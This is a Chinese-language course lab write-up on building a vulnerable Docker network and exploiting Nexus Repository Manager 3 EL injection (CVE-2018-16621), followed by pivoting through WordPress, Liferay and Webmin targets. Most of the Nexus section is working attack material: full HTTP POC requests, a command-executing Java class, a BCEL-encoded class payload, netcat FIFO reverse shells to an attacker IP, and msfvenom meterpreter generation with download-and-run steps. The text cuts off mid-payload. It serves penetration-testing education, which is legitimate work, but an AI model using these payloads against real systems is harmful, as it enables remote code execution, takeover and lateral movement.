# 网安实践2

## 拓扑搭建

候选靶场镜像经过测试，可用列表如下：

- drupal 远程代码执行 （[CVE-2019-6339](https://www.cve.org/CVERecord?id=CVE-2019-6339)）
- wordpress 命令执行 （[CVE-2016-10033](https://www.cve.org/CVERecord?id=CVE-2016-10033)）
- Webmin 远程代码执行（[CVE-2022-0824](https://www.cve.org/CVERecord?id=CVE-2022-0824)）
- jenkins 代码执行（[CVE-2017-1000353](https://www.cve.org/CVERecord?id=CVE-2017-1000353)）（未选用）
- liferay 命令执行（[CVE-2020-7961](https://www.cve.org/CVERecord?id=CVE-2020-7961)）
- ~~ofbiz 远程代码执行 (CVE-2020-9496)~~
- ~~samba 代码执行 (CVE-2017-7494)~~
- ~~rsync-common 未授权访问~~

- phpimap 命令执行（[CVE-2018-19518](https://www.cve.org/CVERecord?id=CVE-2018-19518)）
- Nexus Repository Manager3 EL注入（[CVE-2018-16621](https://www.cve.org/CVERecord?id=CVE-2018-16621)）
- Druid 任意文件读取 （[CVE-2021-36749](https://www.cve.org/CVERecord?id=CVE-2021-36749)）

在此基础上选取镜像搭建如下结构的网络：

<img src="picture/网络拓扑.png" alt="网络拓扑" style="zoom:20%;" />

其中所用网卡信息如下：

|      | 网卡名称      | 子网            | 网关         | 范围  | 驱动   | 启用IPv6 |
| ---- | ------------- | --------------- | ------------ | ----- | ------ | -------- |
| 1    | 自定义CoreNet | 10.10.30.0/24   | 10.10.30.1   | local | bridge | false    |
| 2    | 自定义DevNet  | 10.10.10.0/24   | 10.10.10.1   | local | bridge | false    |
| 3    | DMZ           | 192.170.84.0/24 | 192.170.84.1 | local | bridge | false    |

---

## 第三层漏洞

### Nexus Repository Manager3 EL注入（[CVE-2018-16621](https://www.cve.org/CVERecord?id=CVE-2018-16621)）

> - **漏洞描述：**在 org.sonatype.nexus.security.privilege.PrivilegesExistValidator 和 org.sonatype.nexus.security.role.RolesExistValidator 类中，会将没有找到的 privilege 或 role 放入错误模板中，而在错误模板在渲染的时候会提取其中的EL表达式并执行
>
> - **产品介绍：**Nexus Repository OSS是一款通用的软件包仓库管理（Universal Repository Manager）服务。
>
>   Sonatype Nexus Repository Manager 3中的涉及漏洞的接口为/service/extdirect，接口需要管理员账户权限进行访问。该接口中处理请求时的UserComponent对象的注解的校验中使用EL引擎渲染，可以在访问接口时发送精心构造的恶意JSON数据，造成EL表达式注入进而远程执行任意命令。
>
>   CVE-2018-16621、CVE-2020-10204两个编号触发点和原理相同，可以算作同一漏洞，但CVE-2020-10204为CVE-2018-16621修复后的绕过漏洞。
>   
> - EL 最早出现在 JSP 2.0 中，用于页面简化访问数据对象。典型格式：`${user.name}`、`${1+2}`。EL 表达式最终会由 JSP 引擎 **在页面渲染时执行**，并输出结果。

#### 靶场裸漏攻击

1.浏览器访问靶场环境：

<img src="picture/nexus浏览器访问.png" alt="nexus浏览器访问" style="zoom: 20%;" />

2.该漏洞需要访问更新角色或创建角色接口，在修改用户角色参数roles中进行EL注入或者也可通过创建角色的roles 和 privileges参数进行EL注入，所以我们需要使用默认账号密码admin/admin123登录后台。

<img src="picture/nexus登录.png" alt="nexus登录" style="zoom:20%;" />

3.在此选择对修改用户角色参数roles中进行EL注入，我们选择找到设置中的User处：

<img src="picture/nexus更改Lastname.png" alt="nexus更改Lastname" style="zoom: 20%;" />

随便改改LastName，这里从User改为了User1，然后抓包如下，发现注入点：

<img src="picture/nexus抓包.png" alt="nexus抓包" style="zoom:20%;" />

4.然后把自己的Cookie、HOST、Referer、Origin都替换到下面POC中：

> 其中`Cookie`为抓包中所含有的
>
> `HOST`：{目标靶场ip}:{port}
>
> `Referer`: http://{目标靶场ip}:{port}/
>
> `Origin`: http://{目标靶场ip}:{port}

```http
POST /service/extdirect HTTP/1.1
Host: 192.168.109.4:63019
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
X-Nexus-UI: true
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Cookie: NXSESSIONID=504f1e12-9a30-4d3f-a5fe-42dc882aad03
Referer: http://192.168.109.4:63019/
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: http://192.168.109.4:63019
Content-Length: 308

{
  "action": "coreui_User",
  "method": "update",
  "data": [
    {
      "userId": "admin",
      "version": "1",
      "firstName": "Administrator",
      "lastName": "User",
      "email": "admin@example.org",
      "status": "active",
      "roles": ["${6*6}"]
    }
  ],
  "type": "rpc",
  "tid": 23
}
```

其中`"roles": ["${6*6}"]`中的`${6*6}`是我们注入的想要执行的EL表达式

5.发送POST请求之后，在返回的响应包中可以发现{ "roles": "Missing roles: [36]" }，其中返回的`[36]`，就说明表达式已经被执行了：

<img src="picture/nexus把roles的内容改为EL表达式.png" alt="nexus把roles的内容改为EL表达式" style="zoom:20%;" />

6.这说明EL注入漏洞确实存在并且可以利用，尝试通用payload：

```
//执行命令
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc").getInputStream())}

${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('calc')}

${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")
```

这里构造 远程 rce 有两种方式:

- 反射 invoke 调用 java.lang.Runtime exec
- 反射 newInstance 创建javax.script.ScriptEngineManager 脚本引擎

**invoke 可变参数** `invoke(Object obj, Object... args)` 在el 2.1表达式中不被支持，所以只看使用 `newInstance()` 无参构造出一个 类实例：

- 尝试反射 newInstance 创建javax.script.ScriptEngineManager 脚本引擎

  ```
  {"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"12","firstName":"Administrator","lastName":"User1","email":"admin@example.org","status":"active","roles":["${''.class.forName('javax.script.ScriptEngineManager')}"]}],"type":"rpc","tid":10}
  ```

  也失败了。

7.目前el 2.1 表达式可以实现的功能: ①newInstance() 无参构造一个类实例  ②调用对象 非可变参数的方法。

尝试调用恶意class `com.sun.org.apache.bcel.internal.util.ClassLoader`加载编码后的恶意class导致rce。

这里用 el 表达式表述就是：

```java
${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$evalClass').newInstance()}
```

具体步骤：

- 编写恶意 Java 类 `eval2.java`：

  ```java
  import java.io.BufferedReader;
  import java.io.InputStreamReader;
  
  public class eval2 {
  
      public String exec(String cmd) throws Exception {
  
          Process p = Runtime.getRuntime().exec(             // ***
                  new String[]{"/bin/sh", "-c", cmd});       // ***
  
          BufferedReader br = new BufferedReader(
                  new InputStreamReader(p.getInputStream()));
          BufferedReader err = new BufferedReader(
                  new InputStreamReader(p.getErrorStream()));
  
          StringBuilder sb = new StringBuilder();
          String line;
  
          while ((line = br.readLine()) != null)  sb.append(line).append('\n');
          while ((line = err.readLine()) != null) sb.append(line).append('\n');
  
          return sb.toString();
      }
  }
  ```

- 用 `javac` 编译成 `.class`

  ```
  javac --release 8 eval2.java
  ```

  得到`eval2.class`。

- `scp`拷贝到windows下使用[BCEL编码工具](https://github.com/f1tz/BCELCodeman/releases/tag/1.0)对`eval2.class`进行编码：

  ```shell
  java --add-exports java.xml/com.sun.org.apache.bcel.internal.classfile=ALL-UNNAMED -jar BCELCodeman.jar e .\eval2.class
  ```

  <img src="picture/nexusBCEL编码.png" alt="nexusBCEL编码" style="zoom:20%;" />

- 加载编码后的恶意class，调用exec方法执行 `ls /tmp` 命令获取flag：

  ```
  "roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('ls /tmp')}"]}]
  ```

  <img src="picture/nexus漏洞利用成功.png" alt="nexus漏洞利用成功" style="zoom:20%;" />

  得到flag：`flag-{bmh2640652e-062c-4c7b-919b-0f57edb8ae99}`

8.`kali-attacker`开启端口监听，发送POST请求远程执行反弹shell命令，在此使用基于 FIFO 管道的 Netcat 反弹 shell：

```bash
rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 4444 > /tmp/f
```

<img src="picture/nexus反弹shell成功_getflag.png" alt="nexus反弹shell成功_getflag" style="zoom:20%;" />

完整POC：

```http
POST /service/extdirect HTTP/1.1
Host: 192.168.109.4:33244
Cookie: NXSESSIONID=3ca5fe18-1417-4694-88a4-f6fd8f2a6b28
Content-Type: application/json
Origin: http://192.168.109.4:33244
Referer: http://192.168.109.4:33244/
X-Nexus-UI: true
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 221

{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"10","firstName":"Administrator","lastName":"User1","email":"admin@example.org","status":"active","roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 4444 > /tmp/f')} "]}],"type":"rpc","tid":24}
```

注意其中的目标ip和端口需要更换，反弹shell中的攻击者ip和端口也应替换为自己的。

9.发送POST请求，成功get shell：

<img src="picture/nexus反弹shell成功_getflag.png" alt="nexus反弹shell成功_getflag" style="zoom:20%;" />

---

#### 内网渗透攻击

> 注：此处的渗透路径由前期工作探索得到

##### 第一层

0.Wordpress靶场漏洞利用成功之后，获得反弹shell，查看对应ip为`192.170.84.5`：

<img src="picture/wordpress的ip.png" alt="wordpress的ip" style="zoom:20%;" />

1.`kali-attacker`命令行执行`msfconsole`启动msf。

2.搜索`liferay`漏洞利用模块并使用：

<img src="picture/搜索liferay模块并使用.png" alt="搜索liferay模块并使用" style="zoom:20%;" />

3.查看模块利用所需参数：

<img src="picture/liferay查看参数.png" alt="liferay查看参数" style="zoom:20%;" />

4.模块设置参数并运行：

<img src="picture/liferay设置参数并运行.png" alt="liferay设置参数并运行" style="zoom:20%;" />

5.进入到靶场shell之后查看网络情况，发现其为双网卡，其在`192.170.84.0/24`网段下的ip为`192.170.84.6`：

<img src="picture/liferay查看网络情况.png" alt="liferay查看网络情况" style="zoom:20%;" />

由此可以完善我们的第一层网络拓扑：

<img src="picture/第一层网络拓扑图.png" alt="第一层网络拓扑图" style="zoom:20%;" />

6.在`meterpreter`中添加自动路由并查看：

```bash
# 添加自动路由
run post/multi/manage/autoroute
# 查看路由表
run autoroute -p
```

<img src="picture/liferay添加自动路由并查看路由表.png" alt="liferay添加自动路由并查看路由表" style="zoom:20%;" />

7.执行`bg`将session放于后台，之后搜索`portscan`扫描模块并使用`auxiliary/scanner/portscan/tcp`：

<img src="picture/liferay搜索扫描模块并使用.png" alt="liferay搜索扫描模块并使用" style="zoom:20%;" />

8.设置扫描模块参数并运行：

<img src="picture/liferay设置扫描参数运行.png" alt="liferay扫描设置参数、运行" style="zoom:20%;" />

9.进入已经获得的liferay终端中使用curl进行进一步的网页信息获取：

发现webmin靶场url为`192.170.84.4:10000`：

<img src="picture/发现webmin.png" alt="发现webmin" style="zoom:20%;" />

发现phpimap靶场url为`192.170.84.2:80`，其中网页内容为经典的phpimap漏洞靶场演示页：

<img src="picture/发现phpimap.png" alt="发现phpimap" style="zoom:20%;" />

下载并查看网页html内容，发现druid靶场url为`192:170.84.3:8888`：

<img src="picture/下载druid网页内容.png" alt="下载druid网页内容" style="zoom:20%;" />

<img src="picture/发现druid.png" alt="发现druid" style="zoom:20%;" />

10.由此可得前两层网络拓扑：

<img src="picture/前两层网络拓扑图.png" alt="前两层网络拓扑图" style="zoom:20%;" />

##### 第二层

> 这一层漏洞利用与上一层类似

1.搜索webmin对应漏洞利用模块并使用：

<img src="picture/webmin搜索名称模块并使用.png" alt="webmin搜索模块并使用" style="zoom:20%;" />

2.设置模块所需参数并运行模块：

<img src="picture/webmin设置模块参数并运行.png" alt="webmin设置模块参数并运行" style="zoom:20%;" />

3.得到Command shell之后执行`session -u 2`升级shell。

<img src="picture/webmin升级shell.png" alt="webmin升级shell" style="zoom:20%;" />

4.进入升级后的shell并查看当前靶机网络情况：

<img src="picture/webmin进入sesion查看网络情况.png" alt="webmin进入sesion查看网络情况" style="zoom:20%;" />

发现其为双网卡靶机。

5.添加自动路由并查看路由表：

<img src="picture/webmin添加自动路由并查看路由表.png" alt="webmin添加自动路由并查看路由表" style="zoom:20%;" />

6.搜索端口扫描模块并使用，之后设置参数运行：

<img src="picture/webmin搜索端口扫描模块并使用.png" alt="webmin搜索端口扫描模块并使用" style="zoom:20%;" />

<img src="picture/webmin扫描 设置参数并运行.png" alt="webmin扫描 设置参数并运行" style="zoom:20%;" />

扫描结果得到两个可访问ip：`10.10.10.3` 和 `10.10.10.5` 。

7.进入Webmin靶场shell升级后的session会话，恢复到shell终端后curl访问两个候选靶场地址：

<img src="picture/webmin进入升级后终端，curl访问网页.png" alt="webmin进入升级后终端，curl访问网页" style="zoom: 20%;" />

发现`10.10.10.5:8081` 网页符合Nexus目标靶场的特征。

完善已知网络拓扑图：

<img src="picture/前三层拓扑.png" alt="前三层拓扑" style="zoom:20%;" />

8.之后再次进入升级后的Webmin靶场shell，使用`portfwd`映射Nexus靶场8081端口到本地9001端口：

```bash
portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
```

<img src="picture/进入升级后的webmin，映射nexus端口8081到本地端口9001.png" alt="进入升级后的webmin，映射nexus端口8081到本地端口9001" style="zoom:20%;" />

9.之后本地宿主机就可以通过访问{攻击机ip}:{映射端口}，即`192.168.109.10:9001`访问Nexus靶场。

10.与之前的靶场裸漏攻击步骤相同，登陆进入靶场之后，更改User的Lastname并抓包：

<img src="picture/nexus_映射_更改Lastname.png" alt="nexus_映射_更改Lastname" style="zoom:20%;" />

11.为了拿到稳定的 Meterpreter 会话，进行进一步的扩展内网渗透、提权、持久化，反弹一个更强的 shell：**`Meterpreter`**

- 首先使用 `msfvenom` 生成 payload：

  ```bash
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.109.10 LPORT=5555 -f elf -o meter.elf
  ```

  <img src="picture/nexus_映射_生成meter.elf文件.png" alt="nexus_映射_生成meter.elf文件" style="zoom:20%;" />

  参数说明：

  - `LHOST` 是攻击机 IP（必须是靶机能访问的）
  - `LPORT` 是准备监听的端口（如 5555）
  - `-f elf` 生成 Linux ELF 格式文件
  - `-o meter.elf` 指定输出文件名

- kali攻击机开启http服务：

  ```bash
  python3 -m http.server 8000
  ```

  <img src="picture/nexus_映射_Kali攻击机开启http服务.png" alt="nexus_映射_Kali攻击机开启http服务" style="zoom:20%;" />

- kali攻击机在终端开启端口监听：

  ```bash
  nc -lvnp 6666
  ```

- 利用我们已有的POC，更改其中的ip，端口即可，之后发送POST请求进行远程命令执行：

  ```http
  POST /service/extdirect HTTP/1.1
  Host: 192.168.109.10:9001
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
  Accept: */*
  X-Nexus-UI: true
  Content-Type: application/json
  Referer: http://192.168.109.10:9001/
  Accept-Encoding: gzip, deflate
  X-Requested-With: XMLHttpRequest
  Origin: http://192.168.109.10:9001
  Accept-Language: zh-CN,zh;q=0.9
  Cookie: NXSESSIONID=4d0ca4c3-d8e2-4d22-9e6d-5fd34af7a27a
  Content-Length: 221
  
  {"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"20","firstName":"Administrator","lastName":"User1","email":"admin@example.org","status":"active","roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 6666 > /tmp/f')} "]}],"type":"rpc","tid":10}
  ```

  <img src="picture/nexus_映射_发送POST请求.png" alt="nexus_映射_发送POST请求" style="zoom:20%;" />

- 在msf中使用监听模块并设置相应的参数运行：

  <img src="picture/nexus_映射_使用监听模块，设置对应payload类型.png" alt="nexus_映射_使用监听模块，设置对应payload类型" style="zoom:20%;" />

- get反弹shell之后下载payload文件，为其添加可执行权限，之后运行`meter.elf`：

  ```bash
  # 攻击机中运行
  nc -lvnp 6666 
  # 靶场容器中运行
  wget http://192.168.109.10:8000/meter.elf -O /tmp/meter
  chmod +x /tmp/meter
  /tmp/meter
  ```

  <img src="picture/nexus_映射_nc监听，下载执行脚本.png" alt="nexus_映射_nc监听，下载执行脚本" style="zoom:20%;" />

- 在msf中可以看到目标靶场反连成功，开启了相应的session：

  <img src="picture/nexus反连成功，开启session.png" alt="nexus反连成功，开启session" style="zoom:20%;" />

- 查看目前已有的sessions列表：

  <img src="picture/查看session列表.png" alt="查看session列表" style="zoom:20%;" />

- 进入Nexus目标靶场反连过来的meterpreter中，查看网络情况：

  <img src="picture/webmin进入sesion查看网络情况.png" alt="webmin进入sesion查看网络情况" style="zoom:20%;" />

  发现其为双网卡靶机，之后可进行下一层的内网渗透。

#### 漏洞利用流量检测

1.靶机中使用`tcpdump`对容器中`Devnet`网卡进行监听并将监听结果写入pcap包；

攻击机执行`nc -lvnp 6666` 监听端口接收回连shell；

`yakit`发送自制POC进行反弹shell：

```
POST /service/extdirect HTTP/1.1
Host: 192.168.109.10:9001
Cookie: NXSESSIONID=3ca5fe18-1417-4694-88a4-f6fd8f2a6b28
Content-Type: application/json
Origin: http://192.168.109.10:9001
Referer: http://192.168.109.10:9001/
X-Nexus-UI: true
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 221

{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"10","firstName":"Administrator","lastName":"User1","email":"admin@example.org","status":"active","roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$